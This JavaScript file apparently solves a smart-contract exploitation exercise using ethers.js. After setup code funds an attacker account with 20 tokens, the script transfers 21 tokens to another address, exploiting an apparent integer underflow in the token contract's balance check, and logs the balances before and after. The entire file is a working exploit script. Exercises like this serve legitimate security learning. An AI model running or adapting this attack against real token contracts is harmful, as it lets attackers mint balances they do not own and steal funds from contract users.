import { ethers } from "ethers";


export default async function (providerUrl, ...args) {

  const contractAddress = args[0];
  const tokenRecipient = args[1];

  const provider = new ethers.JsonRpcProvider(providerUrl);
 
  const signer = await provider.getSigner(1);

  const TokenContractAbi = [
      "function transfer(address _to, uint256 _value) public returns (bool)",
      "function balanceOf(address _owner) public view returns (uint256)"
  ]

  // NOT PART OF ATTACK, BOILERPLATE:
  const deployer = await provider.getSigner(0);
  const TokenExploitSetup = new ethers.Contract(
    contractAddress,
    TokenContractAbi,
    deployer
  )
  // NOT PART OF ATTACK

  TokenExploitSetup.transfer(signer.address, 20n);
  console.log("Starting account balance:", await TokenExploitSetup.balanceOf(signer));

  if (signer.address == tokenRecipient) {
    throw new Error("The address receiving tokens from the attack cannot be this account.")
  }

  const TokenRead = new ethers.Contract(
    contractAddress, 
    TokenContractAbi, 
    provider
  );
  
  const TokenWrite = new ethers.Contract(
    contractAddress, 
    TokenContractAbi,
    signer
  );

  console.log("Attack account recipient balance:", await TokenRead.balanceOf(tokenRecipient));

  TokenWrite.transfer(tokenRecipient, 21n);

  console.log(
    "Attack account recipient balance post attack:", 
    await TokenRead.balanceOf(tokenRecipient)
  );

}


